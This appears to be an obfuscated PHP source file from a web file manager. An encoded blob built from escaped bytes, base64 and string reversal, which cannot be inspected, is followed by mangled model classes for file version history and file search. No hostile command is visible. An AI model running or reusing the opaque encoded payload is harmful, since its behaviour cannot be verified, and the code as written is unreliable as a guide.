ec\x5c\xe2\x24\xd4\x14\x40\xeb\x82\x18\xdf\xf\x19\x5\x97\xc9\xb1\x2a\x15\x95\x61\xbb\x18\x67\x64\x23\x49\xba\x4b\xe2\x8a\xd0\x8e\xe\xf1\x97\x65\xa8".base64_decode('FiTrmwJbD8gHfIKQRwGp4mrLoVWT63gnlsyRZQr74SrdIxaSZopJzxOfox7EYsIsgg==')."\152\326\264\163\17\226\122\5\336\44\117\231\20\25\272\127\25\200\370\352\334\344\242\242\106\156\34\357\311\115\174\127\266\163\227\274\262\103\113\252\165\40\151\272\330\360\244\200\120".base64_decode('M2B1cHghzipQtswcmnVbBhqK760dzbNX56yRifdezidH4lsQ9jQnLGdhw6yJl4GlrA==')."\202\321\221\42\335\273\131\112\150\347\17\100\311\221\230\123\223\25\113\210\72\260\273\16\314\2\272\143\170\317\76\143\321\61\326\335\201\147\134\145\145\110\232\115\140\44\54\126\221"."\x85\xbf\xaa\x6b\x99\xb0\xb5\xca\xf4\x58\x30\x84\xc4\xbd\xb2\x3b\x9e\xc6\x51\xe6\xda\x75\xb5\x94\x24\x88\xae\xa0\xb3\x57\x65\x1\x15\x92\x4d\x85\x2b\x20\xfa\x3e\x1e\xa0\x8a\x8d\x0\x5b\xb7\xb5\x55"."\56\346\116\173\365\273\27\262\217\213\130\56\14\126\56\33\224\205\346\30\244\252\54\367\300\73\272\213\77\146\132\143\41\272\27\133\325\252\42\364\1\256\240\205\243\102\51\204\153"."\7\104\346\103\114\236\115\105\164\76\34\255\320\27\76\225\222\316\55\307\335\223\52\27\200\147\230\114\104\117\141\167\270\162\41\134\127\237\7\105\255\164\141\104\336\327\176\322\131"."\xa6\x4b\xa7\xcc\x8\x34\x83\x9e\xdf\xc\xf6\xae\x2\xc5\xc7\xe2\xd2\x38\x8\xc3\xee\x47\xc3\xda\x80\x88\x7a\x71\x9a\xc0\x84\xf4\x53\x6c\xcc\xea\xc4\x5d\x86\xaf\xc\x9b\x9f\xe1\x8a\xce\x28\x75\xe9".base64_decode('nFCkSgBtJ/OW6XAuDqejdSgCUZlcS9Ii/qWiHdedouRTnGdF5zprXWNnPVFIIz7ZJQ==').base64_decode('xtIT9KrvkXPZYUcrc9IuNNvwNCYkfacaLUAhXgQIBktPmxaRK0gOJkpOXM/JwajJ5Q==')."\51\370\16\113\257\121\5\366\351\43\155\163\274\352\21\247\137\221\75\4\111\276\334\121\110\162\332\57\21\176\376\331\12\247\30\125\132\63\15\314\222\22\110\376\132\304\243\107\342".base64_decode('J1mTEEFGopLiFy8eko4ZqCgyxcQsTnAFxFkLHoEtp6FqsU9lMTK5CGmzqghNw0SLcA==')."\171\42\247\330\330\33\177\37\233\266\132\51\65\232\42\111\22\104\323\334\11\24\100\107\0\11\22\306\165\246\342\351\237\335\354\147\56\352\144\353\25\306\65\0\336\106\173\101\132".base64_decode('BpjBYmgDFCQhn8hjStdXxA2KcPdAPL7w+SSuYXjIks5unStPEh8pMhoVWgZUpxJn6A==').strrev('F/şu&QFP‡”¤ÃòãÀ•<—tºbÓuè¿-ÁÓ¸gh°Z\\;“„!N•«')."\x68\x4b\x50\xef\x31\x4c\xa7\x99\xe3\x25\x11\x9d\x34\x79\x64\xb5\xc6\x5\x5e\x95\x50\x25\xb5\xeb\x85\xf7\x50\x1b\x1a\xb1\x5d\xaf\x4b\x8e\xd5\x3d\xce\xad\x2f\xb1\xfe\x14\x3e\x14\xb9\xee\xab\x2d\x7"."\x58\x2a\x5f\x9c\xb6\x2b\x40\xf5\xc5\x5c\xa5\x79\x14\xcf\x35\xaa\x33\x13\x5d\x26\x6f\xe9\xed\xea\xd\xf2\xa8\x36\xbe\x3d\x29\xab\x2e\x9c\x56\xb5\x33\xa5\x2c\x7d\x8c\xb9\x39\x1c\x2d\x1a\x69\x25\x1a"."\133\36\151\17\105\73\42\211\225\112\116\167\24\241\32\102\36\357\160\157\145\42\124\244\200\147\253\72\305\337\221\300\237\376\24\242\320\375\31\316\305\330\202\137\221\264\346\244\47"."\xb8\xdc\xd5\xd2\xf5\xa7\x5b\x55\x35\x96\xb0\xe5\x4d\xa1\xaa\xc\x16\x95\xd6\xc8\x5d\x10\x32\x44\x29\x73\xd9\xd2\xab\xf3\x8f\xeb\x58\x3d\x4a\xea\xb1\x54\xa0\x52\xa3\x37\x90\xbf\x76\xb\xe4\xb1\xf"."\71\67\42\74\364\322\124\235\67\112\43\206\155\210\215\317\112\214\313\265\207\72\272\43\75\152\50\32\215\255\161\151\27\12\41\261\305\237\126\311\310\57\261\110\63\43\46\201\266"."\x5e\xed\x4b\xd\x3c\x51\xc9\x4e\xef\x3d\x62\xb\x3a\x7d\xb2\x7f\xbd\x32\xbb\xe\x81\xc7\x24\xf9\xc3\xc\x34\x28\x3d\x94\x54\xb6\x34\xc3\xd6\xa5\x8\xfa\xc0\xcf\x4c\x30\x74\xd1\xa\x5\xd7\x13\x89"."\205\254\24\254\270\117\326\232\115\251\264\1\26\47\271\360\253\225\41\36\131\336\225\374\137\167\325\310\10\367\131\106\206\151\145\160\273\104\372\146\103\273\374\234\46\153\263\352\61".base64_decode('qM99VsonLpBU4lKIvW5nEvYDaGMaF4mp1CmiaAIxxtZ4Wb7BC2aCHMT0A3sJDLNrIw==').base64_decode('HBCMAM4OteHmKHuIuF4s5GIsA9MWRXgC4Oy6wfY8kOVVrHW9SF/VBnmdgab14+GgnA==')."\x1b\xc4\xe0\x50\x88\xbf\xbe\x22\x8a\x7a\x53\x6a\x74\x0\x25\x2b\x42\x86\xc4\x33\x28\xad\x4a\x13\x7d\xab\x8d\xbf\xac\xa1\x2c\x61\x56\xd6\xa2\x1\xe2\xd7\x2b\x5c\x2c\x3b\x2e\xd6\xb9\x4b\xd6\xa0\x97"."\346\206\106\20\112\107\260\106\130\267\310\54\216\127\105\270\4\107\121\326\57\256\214\210\337\25\51\145\115\31\176\4\41\143\163\10\372\342\42\345\321\175\210\267\321\235\352\347\231".base64_decode('aPH/LwVpYkJS0XRXUt0h23vUCbILvzyVN0fdzy7iGO9bU65XpqRNQ4yB5Xex3IV8VQ==')."\xef\xbb\x28\xe4\x3d\x5d\x5\x2d\x75\x98\x45\xec\x41\x8a\xf1\x80\x24\xb3\xd4\xf4\xc\xfa\x33\x0\xbf\xec\x38\xf3\x76\x82\x22\x2a\x68\xb2\x91\x2f\xaa\xf6\xbc\x51\xc8\x58\x5c\x59\x46\x44\x74\xeb\x82".base64_decode('MSelsL6Ixt4NJo/QdTCcDE/K1HqADPvoc7+MIx4cEmen+wEWfuVri81gO64nf5JmUg==')._kodDe('LOu9NxqjePqMf6fRvXSkCx4897RW/qXhkUSX6PhRfDm4jdCale3Af1jFpvAqPYb82Vg=')."\x4a\x2b\xc4\xa9\x8e\x99\xcb\x78\xc6\x42\xdc\x14\xd7\x1b\x75\x65\xa3\x51\x41\xad\x5c\x16\x17\x50\xf2\x91\x89\xfe\x77\x19\x2d\x42\x5a\x5f\xb2\x4b\x25\xa6\xf7\x2a\xbd\xa7\x4e\x88\x35\x27\x5d\x5d\xd1"."\x48\xb8\xc6\xaa\x94\x22\x54\xea\xef\x8a\xb5\x24\x3e\x4f\x56\x6e\xa6\x17\x76\xc2\x4c\xe\xb2\xa3\x7e\xf6\xd2\x1b\x3a\x0\x98\x5c\x25\xbb\x35\xe5\x22\xe8\x4e\xe9\x7d\xf9\x60\xf5\x2d\x2b\xd6\x9e\x3"."\214\42\53\227\302\65\167\100\146\304\40\203\262\104\21\113\303\265\221\361\122\102\324\60\175\321\217\140\12\231\160\377\214\130\351\75\45\170\71\260\326\363\110\164\345\223\237\16\75".base64_decode('y5kaHBaHu+w+RKhfeB/1q36gkD1GyLYOvERY43nBKV8n9AmLyM96dUnY7bmfo8bj4A==').base64_decode('pAHnG6pYDy/XwcHqKRD3AjlpVstjxT206+1EadSA2qrfX5TAII27YhV85Erex9zv1Q==')."\174\302\321\365\6\224\167\102\153\74\2\371\271\25\202\152\57\141\272\62\156\254\327\262\44\145\261\73\116\157\66\303\265\166\125\113\27\366\76\324\275\151\325\1\261\256\230\151\236".base64_decode('M2+RLNwQUyguBJmbcPozD/YzXxSKexkqzKeqvPtJolvruvqJUM8J8L/bMIJ7oFklHQ==')."\350\352\247\226\253\40\100\326\251\244\35\44\35\210\36\165\17\23\353\143\330\142\327\321\43\120\274\22\352\156\213\222\17\65\306\41\235\173\142\263\320\127\36\315\2\346\261\213\130"."\x56\xee\x58\x9a\x9b\xa1\xac\xc5\x37\x11\x48\x30\x26\xcd\x20\xcf\xa7\xeb\xde\xbe\x13\xc0\x80\x34\x45\x24\x4b\x8c\x95\x5c\xa3\x63\x7a\x45\x41\xb8\x38\x3e\x17\x89\x24\x32\x56\x2a\xc0\xb1\x8d\x6d\xc0".base64_decode('xW6TMNH/YgIZj0TZKaHsU2PkwVMYaqnxiqekO/EZ/abUHecH/ZrjlxakJD7UnRiZYA==')."\x40\x11\x82\x6d\x75\x8f\xd5\x53\x3d\x2a\x26\xea\xd8\xe0\x53\xa6\xca\x54\x4d\xe2\x49\x8f\x7d\xa\x2f\x61\x12\x71\x87\x4b\x33\xc3\xd0\x29\xb8\x7e\x86\xa9\xe4\x67\x4c\x9d\xbc\x60\x5f\xe8\xe\x75\xed"."\x56\xc9\x53\xb1\x6c\x2d\x47\x2a\x92\xb7\x41\x75\xd5\xd2\x5b\x8e\x42\x10\x44\x24\x47\x30\x8\xd8\xc3\xc4\xf9\x29\xb1\x98\xc\x2d\xe7\x56\x94\x9a\xa4\xa0\xe5\x96\x4e\x61\xe8\x4a\xef\xf4\x9a\xf2\xb7".base64_decode('gDrG9DHm8RW17uIuUbjD82wzwUret5wZiAgqEFhOMsZ1sTL8dTsXa2N7n7REBJ7sww==')."\31\5\275\117\2\3\72\44\132\362\264\65\351\100\25\147\247\370\352\251\24\105\100\22\351\22\56\212\47\272\154\226\261\267\53\317\316\147\226\320\266\347\251\133\352\117\227\176\63"."\x62\xff\xff\xf7\x6b\x8e\xff\xb7\x1e\x71\x9c\xd7\xc4\x84\xef\xae\x97\xa0\x97\x3\xc9\xcd\xa8\xbc\x9\xc9\x83\x37\x15\xfc\x7a\xc6\xe1\x3e\x34\xf\x81\x55\xc4\xdf\x39\x97\xc2\x5c\x15\x98\x79\x3c\x63"."\x8e\xd0\x34\x76\xe1\xa4\x15\xa\xd2\xd1\x5a\x9b\x49\xa9\x7a\x63\x17\x2d\xbe\x21\xfe\x2c\x6b\xad\x80\xd7\xe4\xce\xfb\xde\x6e\x3f\x7b\x8b\x9e\x3c\xa5\xbb\xa1\x56\x46\x81\x79\x38\x2f\x54\x63\x1d\xd3"._kodDe('MTMVhO/cl950MmnryhKckA+IFwJVD75muX1JkmrIHik07SdRqcnIhkV1Hm16JMavib0=')."\21\261\364\7\254\44\143\42\127\124\25\376\112\272\146\301\25\51\3\30\146\15\233\66\263\11\164\225\350\366\274\27\112\63\331\62\64\135\42\372\152\165\201\352\322\174\347\313\105"."\260\316\265\133\152\305\137\175\157\362\76\3\77\333\137\335\30\65\171\300\202\223\70\26\125\60\341\23\271\305\41\327\247\65\312\320\225\232\20\171\246\330\53\265\167\54\177\247\125"."\x48\xe2\xf0\x97\x3c\x5e\xb6\xf3\x7b\x2d\x93\x10\x74\xee\x58\x2e\xbe\x91\x94\x5b\xa5\x87\xcb\x67\x4\xaa\xce\x17\x86\xed\x5c\x20\x47\xbc\x9a\xb8\x26\x34\x4c\xe2\x4\x9f\x15\xed\xeb\x6e\x20\xd6\x3b"."\260\142\21\373\320\151\212\271\227\236\10\307\173\112\70\252\304\156\305\210\304\120\76\265\231\101\235\244\217\16\121\56\271\236\55\277\67\342\56\211\55\14\334\173\151\151\255\154\151".base64_decode('07KlbDy+Vl68wmS5hZyGH3F2XHMh3jPwvmNAuHnKoLv4dLjJlaOki05EbGfcD6OQRA==')."\x12\xcd\x7c\x9a\x42\xd\xd2\x55\x9d\xfb\xa6\x94\xfb\x6b\xaf\xc2\x94\x15\x23\x2a\x25\x93\x52\xcc\x55\x1e\xfa\xc5\x46\x87\x11\xe1\x9\x83\x24\xd3\x4b\x88\x90\xf4\x52\xb8\xb7\x94\xfb\x51\x79\xe9\x5e"."\x35\x4d\x56\x5e\xb8\xfa\xea\x4c\xdc\xe8\x49\x74\x6\x2b\x86\x39\x21\x71\x4\x78\xe2\x6b\xbd\x91\x9e\xd5\x46\x4\x91\x24\x68\xf1\x4c\xa6\x53\x1b\xa9\x91\x35\xc3\xb8\x11\x1e\x8b\x62\x78\x56\x42\x64"."\x49\x76\xcc\x42\x5\x5e\x1f\xf5\x3e\x15\x1d\x90\x6d\x9f\x5d\x19\xab\x63\x85\x9d\xb3\x54\x5e\x5c\xa2\x88\x61\xe2\xb8\x5a\xc3\x27\x1b\xcd\x5d\x5c\xb6\xa3\xe6\x8b\x4a\x44\xd1\xa7\x2d\xb8\xd6\x95\xc4"."\xf7\x60\x33\xf\xa1\x8e\x45\x87\xc2\xd9\x7b\xd1\xa4\xdb\x6a\x9b\x67\xe3\x73\x86\xf2\x10\xa3\x1a\xbf\x2b\xd6\xc3\xc9\x61\x49\xa\xa3\x18\x3c\x49\xb6\xfc\xcc\xb3\xfb\xba\x54\x96\x37\x48\x4b\x40\x2f"."\104\245\352\344\253\324\51\13\44\152\67\42\126\245\33\304\222\271\273\110\140\107\235\351\2\276\204\42\371\300\40\147\134\116\164\165\307\73\265\204\11\21\313\227\106\26\211\30\227"."\246\205\334\111\64\277\356\351\275\134\300\73\62\132\302\36\65\234\164\136\342\214\252\23\253\343\255\52\240\102\103\265\373\353\355\25\203\251\227\137\24\225\124\365\107\322\307\110\232"."\65\312\320\36\325\54\106\223\160\111\101\256\272\312\116\1\2\134\226\46\341\262\125\311\254\260\44\136\221\312\71\132\305\236\142\170\325\300\3\231\103\246\306\200\75\234\71\315\72".base64_decode('FTxrZq5uDlacNzcRUtTuhZAteO7Fa/WiZuYpeyFye06BWriWpdTArkJBohqPi7Qa6g==').base64_decode('GrROfEbLrrJqJMu6H7W1Q+I1t77tVtvwxMuAAU+rQF3BakOcYsFgbyxKWugzXPi9Ug==')."\x1a\x2a\x99\xfc\xcc\xc8\x8\x2d\x43\xac\x21\x1d\xb2\xbc\x80\xac\xaa\xcd\xbd\x4e\x4b\x15\xc9\x79\x6d\x4d\xa5\x78\x1f\xe6\xeb\xab\x39\xe8\x82\xc6\x24\xff\x92\x35\x1\x65\x79\x4c\xc7\x48\xeb\x6e\xf"."\xb9\xb2\xc7\x2c\x9a\xce\x1a\x29\x48\xb2\x41\x8f\x58\x4e\x48\x19\x5c\x6a\x5\x35\x4\x57\x24\xa\xe8\x3a\x21\x21\xa7\xf5\x49\x14\x8b\x58\x13\x2e\x2b\xe\x4a\x27\xc0\xc5\x2\xbd\x93\x6c\xc7\x77\xdf"."\374\66\212\170\167\245\347\52\115\116\230\226\343\303\151\111\263\114\176\333\114\307\21\167\364\224\255\47\304\40\76\34\175\222\12\12\372\22\127\117\270\123\344\116\203\54\133\202\136".strrev('	ô !M¸è¸¡±3¾cÊiÌ@ˆ®=Ï¤·ÙòÂW|\\”‚TÓ¡9~bÜ\'È').base64_decode('LD9ZiYaY4NtBmhKENxf8GiYU4bm1wGA55ypOH63iyqWfVQNIUUUV1OE6kXWBuU0imQ==').strrev('€—$½%éš3“…Qê_ÖUh‘C»…¥S=b»z’ª’”’”™*½Ÿêñbk%'."\r".'êJ¨')."\123\365\42\322\276\122\364\204\134\67\13\341\174\71\157\62\231\73\273\274\110\150\5\306\245\113\266\243\172\121\170\267\23\145\112\106\172\110\10\367\64\211\170\267\231\33\112\376\341"."\176\354\310\243\46\310\26\51\124\204\165\217\172\240\356\170\31\142\261\277\172\276\327\71\41\55\356\317\3\256\173\166\51\236\354\7\202\140\244\65\47\37\264\44\142\146\115\0\311"."\202\335\352\213\6\222\52\0\200\73\266\302\4\305\265\101\63\45\270\25\62\37\374\362\233\362\64\140\326\11\360\225\224\315\350\267\53\331\321\162\65\357\236\251\150\17\157\177\41".base64_decode('dPs/OrLzdVmsAAA=').""."".""."".""."", 10, -8))); goto dçßÃœŞ; DªÛÆ¾‚…À: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\x63\x65\137\x68\x69\163\x74\x6f\x72\x79"; public function historyCount($ñÛ×¥ò) { $¥âÍÃÜÛ =& $_SERVER[å¸¿•¶£]; if (!$ñÛ×¥ò) { return array(); } if (is_string($ñÛ×¥ò) || is_int($ñÛ×¥ò)) { $ñÛ×¥ò = array($ñÛ×¥ò); } $Ğ¹„ƒÛÏ = array($¥âÍÃÜÛ[402], $¥âÍÃÜÛ[1896] => $¥âÍÃÜÛ[491]); $Î–¤à = array($¥âÍÃÜÛ[402] => array($¥âÍÃÜÛ[7], $ñÛ×¥ò)); $öÕİ¬õŠ = $this->field($Ğ¹„ƒÛÏ)->where($Î–¤à)->group($¥âÍÃÜÛ[402])->select(); return array_to_keyvalue($öÕİ¬õŠ, $¥âÍÃÜÛ[402], $¥âÍÃÜÛ[491]); } public function addHistory($ĞîĞ˜¸ , $Öï¹âàÕ = '') { $úĞÙÍÈ =& $_SERVER[å¸¿•¶£]; $‰ƒ®Êİ = array($úĞÙÍÈ[417] => $ĞîĞ˜¸ [$úĞÙÍÈ[402]], $úĞÙÍÈ[1665] => isset($ĞîĞ˜¸ [$úĞÙÍÈ[456]]) ? $ĞîĞ˜¸ [$úĞÙÍÈ[456]] : $ĞîĞ˜¸ [$úĞÙÍÈ[454]], $úĞÙÍÈ[469] => $ĞîĞ˜¸ [$úĞÙÍÈ[468]], $úĞÙÍÈ[545] => $ĞîĞ˜¸ [$úĞÙÍÈ[76]], $úĞÙÍÈ[2106] => $Öï¹âàÕ); if ($GLOBALS[$úĞÙÍÈ[6]][$úĞÙÍÈ[89]][$úĞÙÍÈ[1224]] >= 1) { $this->historyAutoClear($‰ƒ®Êİ[$úĞÙÍÈ[402]]); $this->add($‰ƒ®Êİ); } Hook::trigger($úĞÙÍÈ[2107], $‰ƒ®Êİ); Model($úĞÙÍÈ[2108])->eventFileEdit($ĞîĞ˜¸ [$úĞÙÍÈ[402]]); } private function historyAutoClear($â¨ü¤íò) { $üñ¥†ÍÂ =& $_SERVER[å¸¿•¶£]; $¤€Íëíõ = Model($üñ¥†ÍÂ[777])->get($üñ¥†ÍÂ[1246]); $öş‚åªî = $GLOBALS[$üñ¥†ÍÂ[6]][$üñ¥†ÍÂ[89]][$üñ¥†ÍÂ[1224]]; $Êàİ¡£Û = $¤€Íëíõ == $üñ¥†ÍÂ[1247] ? min(5, $öş‚åªî) : $öş‚åªî; $Êàİ¡£Û = $Êàİ¡£Û <= 0 ? 0 : $Êàİ¡£Û - 1; if ($Êàİ¡£Û >= 500) { return; } $Á˜ä¶Ò’ = array($üñ¥†ÍÂ[417] => $â¨ü¤íò); $´ä¡¬³¬ = $this->field($üñ¥†ÍÂ[2109])->where($Á˜ä¶Ò’)->order($üñ¥†ÍÂ[2103])->select(); if (!$´ä¡¬³¬ || $Êàİ¡£Û >= count($´ä¡¬³¬)) { return; } $öˆ˜§Ÿ  = array_to_keyvalue($´ä¡¬³¬, $üñ¥†ÍÂ[12], $üñ¥†ÍÂ[399]); $öˆ˜§Ÿ  = array_slice($öˆ˜§Ÿ , $Êàİ¡£Û); $¤©²ƒå– = array_to_keyvalue($´ä¡¬³¬, $üñ¥†ÍÂ[12], $üñ¥†ÍÂ[468]); $¤©²ƒå– = array_slice($¤©²ƒå–, $Êàİ¡£Û); if (!$öˆ˜§Ÿ  || !$¤©²ƒå–) { return; } $Á˜ä¶Ò’ = array($üñ¥†ÍÂ[419] => array($üñ¥†ÍÂ[7], $öˆ˜§Ÿ )); $this->where($Á˜ä¶Ò’)->delete(); Model($üñ¥†ÍÂ[471])->remove($¤©²ƒå–); } public function listData($Ìøš’åé) { $°ì…å†õ =& $_SERVER[å¸¿•¶£]; $ÁË«Ùü¬ = array($°ì…å†õ[417] => $Ìøš’åé); $æÓ©ÃíÜ = $°ì…å†õ[2110]; $îÊ™²â· = $this->field($æÓ©ÃíÜ)->where($ÁË«Ùü¬)->order($°ì…å†õ[2103])->selectPage(); $this->_listAppendUser($îÊ™²â·[$°ì…å†õ[369]]); $ˆæ¡È®é = Model($°ì…å†õ[777])->get($°ì…å†õ[1246]); $çê¬â  = 5; if ($ˆæ¡È®é == $°ì…å†õ[1247]) { $îÊ™²â·[$°ì…å†õ[369]] = array_slice($îÊ™²â·[$°ì…å†õ[369]], 0, $çê¬â ); $îÊ™²â·[$°ì…å†õ[366]] = array($°ì…å†õ[2111] => 1, $°ì…å†õ[2112] => 20, $°ì…å†õ[2113] => 1, $°ì…å†õ[2114] => count($îÊ™²â·[$°ì…å†õ[369]])); } return $îÊ™²â·; } protected function _listAppendUser(&$Õµ·±†’) { $½¤©İÀ– =& $_SERVER[å¸¿•¶£]; $áÛƒˆ©Ô = array_to_keyvalue($Õµ·±†’, $½¤©İÀ–[12], $½¤©İÀ–[1674]); $ÅşÑ±Ÿå = Model($½¤©İÀ–[525])->userListInfo($áÛƒˆ©Ô); foreach ($Õµ·±†’ as &$¿ÙÅìßú) { $ÑæÊœ¤ = $¿ÙÅìßú[$½¤©İÀ–[1674]]; $¿ÙÅìßú[$½¤©İÀ–[454]] = $ÅşÑ±Ÿå[$ÑæÊœ¤] ? $ÅşÑ±Ÿå[$ÑæÊœ¤] : !1; } unset($¿ÙÅìßú); } public function fileInfo($Ûş¥°ŞŒ) { $ø ¤ş =& $_SERVER[å¸¿•¶£]; $Ëç‘‰ÄÍ = $this->tablePrefix; $İíö½õÂ = "{$Ëç‘‰ÄÍ}\x69\x6f\x5f\146\151\154\145\x20\146\151\154\x65\x73\40\157\156\x20\146\x69\x6c\145\163\56\x66\151\154\x65\x49\x44\40\75\x20\x68\x69\163\164\157\x72\x79\x2e\146\151\x6c\x65\111\104"; return $this->alias($ø ¤ş[2115])->where(array($ø ¤ş[419] => $Ûş¥°ŞŒ))->join($İíö½õÂ, $ø ¤ş[2116])->find(); } public function removeItem($¦…‘”ñ) { $¢ûØ×Îá =& $_SERVER[å¸¿•¶£]; $òºµ½áŒ = array($¢ûØ×Îá[419] => $¦…‘”ñ); $”¾±•’² = $this->where($òºµ½áŒ)->find(); if ($”¾±•’²) { $‚øºûÖ = $this->where($òºµ½áŒ)->delete(); Model($¢ûØ×Îá[471])->remove($”¾±•’²[$¢ûØ×Îá[468]]); return $‚øºûÖ; } return !1; } public function removeBySource($˜ë¸ëÁè) { $¾‹î¿¾ =& $_SERVER[å¸¿•¶£]; if (!$˜ë¸ëÁè) { return !1; } if (!is_array($˜ë¸ëÁè)) { $˜ë¸ëÁè = array($˜ë¸ëÁè); } $Óñğæ·× = array($¾‹î¿¾[417] => array($¾‹î¿¾[7], $˜ë¸ëÁè)); $ŸĞªë½ì = $this->field($¾‹î¿¾[469])->where($Óñğæ·×)->select(); if ($ŸĞªë½ì) { $this->where($Óñğæ·×)->delete(); $£Œ³Úº¾ = array_to_keyvalue($ŸĞªë½ì, $¾‹î¿¾[12], $¾‹î¿¾[468]); Model($¾‹î¿¾[471])->remove($£Œ³Úº¾); } return !0; } public function setDetail($ØÃîÂâ¾, $©¤¿ÔËâ) { $ì¿ÆĞ¢û =& $_SERVER[å¸¿•¶£]; return $this->where(array($ì¿ÆĞ¢û[419] => $ØÃîÂâ¾))->save(array($ì¿ÆĞ¢û[2106] => $©¤¿ÔËâ)); } public function rollbackToItem($¼Â°ÙŠ“, $ªóµ¹œÊ) { $ùÔ×¹Ô× =& $_SERVER[å¸¿•¶£]; $½Îƒ«ü‘ = Model($ùÔ×¹Ô×[832])->sourceInfo($¼Â°ÙŠ“); $this->addHistory($½Îƒ«ü‘, LNG($ùÔ×¹Ô×[2117])); $éî»ºäÍ = $this->find($ªóµ¹œÊ); $Àªõ‘ş = array($ùÔ×¹Ô×[468] => $éî»ºäÍ[$ùÔ×¹Ô×[468]], $ùÔ×¹Ô×[76] => $éî»ºäÍ[$ùÔ×¹Ô×[76]], $ùÔ×¹Ô×[85] => time(), $ùÔ×¹Ô×[456] => USER_ID); Model($ùÔ×¹Ô×[832])->where(array($ùÔ×¹Ô×[402] => $¼Â°ÙŠ“))->save($Àªõ‘ş); return $this->where(array($ùÔ×¹Ô×[419] => $ªóµ¹œÊ))->delete(); } public function clearSame($õ–€¦šÎ) { $“·Æ…‡¤ =& $_SERVER[å¸¿•¶£]; $ÕØõ™®“ = $this->listData($õ–€¦šÎ); $“Ó§îŸá = array_to_keyvalue_group($ÕØõ™®“, $“·Æ…‡¤[468]); $‡ôµÔåõ = array(); $ „™Ù°Ó = array(); foreach ($“Ó§îŸá as $ÍÅİ«èù) { if (!$ÍÅİ«èù || count($ÍÅİ«èù) <= 1) { continue; } foreach ($ÍÅİ«èù as $›«§İó) { $‡ôµÔåõ[] = $›«§İó[$“·Æ…‡¤[468]]; $ „™Ù°Ó[] = $›«§İó[$“·Æ…‡¤[399]]; } } if (!$ „™Ù°Ó) { return; } $this->where(array($“·Æ…‡¤[399] => array($“·Æ…‡¤[7], $ „™Ù°Ó)))->delete(); Model($“·Æ…‡¤[471])->remove($‡ôµÔåõ); } public function userSpace() { $Ê¾¬˜îà =& $_SERVER[å¸¿•¶£]; $…ó×œé = $this->tablePrefix; $µùôõõ¥ = array($Ê¾¬˜îà[1665] => USER_ID); $‰ÆµÀÈô = "{$…ó×œé}\151\x6f\137\x66\x69\154\145\40\146\x69\154\x65\x73\x20\157\x6e\40\x66\151\x6c\145\163\56\146\151\x6c\x65\111\104\x20\75\x20\x68\x69\163\164\x6f\x72\171\56\x66\151\x6c\x65\111\x44"; return $this->alias($Ê¾¬˜îà[2115])->where($µùôõõ¥)->join($‰ÆµÀÈô, $Ê¾¬˜îà[2116])->sum($Ê¾¬˜îà[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($†ûîÙ‰é) { $“µ‚¼ñ =& $_SERVER[å¸¿•¶£]; $ÌŸÇŸÌÙ = KodIO::fileTypeList(); $Î¤’Ê = $ÌŸÇŸÌÙ[$†ûîÙ‰é]; if (!$Î¤’Ê) { return array(); } $²ˆù‚ = $Î¤’Ê[$“µ‚¼ñ[174]]; $­°ÀÕ©Ğ = $“µ‚¼ñ[7]; if (!$Î¤’Ê[$“µ‚¼ñ[174]]) { $à‚éÉ§£ = array_to_keyvalue($ÌŸÇŸÌÙ, $“µ‚¼ñ[12], $“µ‚¼ñ[174]); $²ˆù‚ = implode($“µ‚¼ñ[50], $à‚éÉ§£); $­°ÀÕ©Ğ = $“µ‚¼ñ[2118]; } $¸ó¿ÖâÜ = explode($“µ‚¼ñ[50], trim($²ˆù‚, $“µ‚¼ñ[50])); return array($­°ÀÕ©Ğ, $¸ó¿ÖâÜ); } public function listPathType($ï¥ôó˜) { $„ÃêšğŠ =& $_SERVER[å¸¿•¶£]; $ÒÒ­¦¶ = $this->fileTypeWhere($ï¥ôó˜); if (!$ÒÒ­¦¶) { return array(); } $€¶ëää¹ = USER_ID; $„½Ğï‚Ê = Model($„ÃêšğŠ[525])->getInfo($€¶ëää¹); $®ßê÷å = array($„ÃêšğŠ[576] => SourceModel::TYPE_USER, $„ÃêšğŠ[511] => array($„ÃêšğŠ[540], $„ÃêšğŠ[521] . $„½Ğï‚Ê[$„ÃêšğŠ[87]][$„ÃêšğŠ[402]] . $„ÃêšğŠ[541]), $„ÃêšğŠ[577] => $€¶ëää¹, $„ÃêšğŠ[574] => 0, $„ÃêšğŠ[575] => $ÒÒ­¦¶); return $this->listSource($®ßê÷å); } public function listSearch($ÒÉü Í±, $œÙï†° = 300) { $Ææ ïˆÇ =& $_SERVER[å¸¿•¶£]; if (isset($ÒÉü Í±[$Ææ ïˆÇ[1957]]) && $ÒÉü Í±[$Ææ ïˆÇ[1957]]) { $ÒÉü Í±[$Ææ ïˆÇ[1957]] = str_replace($Ææ ïˆÇ[384], $Ææ ïˆÇ[2119], trim($ÒÉü Í±[$Ææ ïˆÇ[1957]])); } $Ä§…Ôìî = $this->_parseSearchWhere($ÒÉü Í±); if (!isset($Ä§…Ôìî[$Ææ ïˆÇ[431]])) { $Ä§…Ôìî[$Ææ ïˆÇ[431]] = 0; } $Õñ£Š£ = $Ææ ïˆÇ[2120]; $Ë–íÖ–€ = $Ä§…Ôìî; $Æ¿úœêÀ = $Õñ£Š£; $this->_listSearchBindPinyin($ÒÉü Í±, $Ä§…Ôìî, $Õñ£Š£); $this->alias($Ææ ïˆÇ[446])->_makeOrder(); $Ä§…Ôìî = $this->parseWhereLike($Ä§…Ôìî); $ğÊÄó¥ = $this->distinct(!0)->field($Õñ£Š£)->where($Ä§…Ôìî)->selectPage($œÙï†°); if ($GLOBALS[$Ææ ïˆÇ[6]][$Ææ ïˆÇ[381]][$Ææ ïˆÇ[382]] && Input::check($ÒÉü Í±[$Ææ ïˆÇ[1957]], $Ææ ïˆÇ[583]) && $ğÊÄó¥[$Ææ ïˆÇ[366]][$Ææ ïˆÇ[353]] == 1 && $ğÊÄó¥[$Ææ ïˆÇ[366]][$Ææ ïˆÇ[367]] == 0) { $ğÊÄó¥ = $this->distinct(!0)->field($Õñ£Š£)->where($Ë–íÖ–€)->limit(1000)->select(); $ğÊÄó¥ = array_page_split($ğÊÄó¥, !1, $œÙï†°); } $this->_listSearchFileContent($ğÊÄó¥, $ÒÉü Í±, $Æ¿úœêÀ, $Ë–íÖ–€); $this->_listSearchDesc($ğÊÄó¥, $ÒÉü Í±, $Æ¿úœêÀ); $this->_listSearchTag($ğÊÄó¥, $ÒÉü Í±, $Æ¿úœêÀ); $this->_listSearchGroupTag($ğÊÄó¥, $ÒÉü Í±, $Æ¿úœêÀ); 